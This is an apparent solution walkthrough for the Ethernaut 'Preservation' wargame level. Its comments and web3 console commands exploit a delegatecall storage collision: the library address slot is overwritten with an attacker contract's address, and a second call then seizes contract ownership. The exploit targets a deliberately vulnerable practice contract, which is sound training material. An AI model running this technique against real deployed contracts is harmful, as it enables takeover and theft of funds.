//Strategy
    //1. Deploy a contract which has the same storage format as Preservation. This contract should have a method which matches the signature of the setTime method, but will actually change the owner instead of the storedTime
    //2. Call setFirstTime with a int which corresponds to the address of the new contract in step 1
    //3. Call set FirstTime again with any param 



//check owner (initial) 
await contract.owner()

// Perform strategy steps at the top

//when transforming contract address to int
//consider following
    //address is 20 bytes instead of 32 e.g. 0xdB37900E569AA78f110124F8bCB4d18CD3349a28
    // so we need to pad the address
    // 0xdB37900E569AA78f110124F8bCB4d18CD3349a28
    // 0x000000000000000000000000dB37900E569AA78f110124F8bCB4d18CD3349a28

//use web3 util function to convert hex to number

let param = web3.utils.toBN("0x000000000000000000000000dB37900E569AA78f110124F8bCB4d18CD3349a28")


//call method to change address of library in Preservation contract
await contract.setFirstTime(param)

//confirm that address of library has changed to the level16 contract
await contract.timeZone1Library()

// call same method again to now run the method in the level16 contract and change owner
await contract.setFirstTime(param)

//confirm owner change
await contract.owner()

//submit solution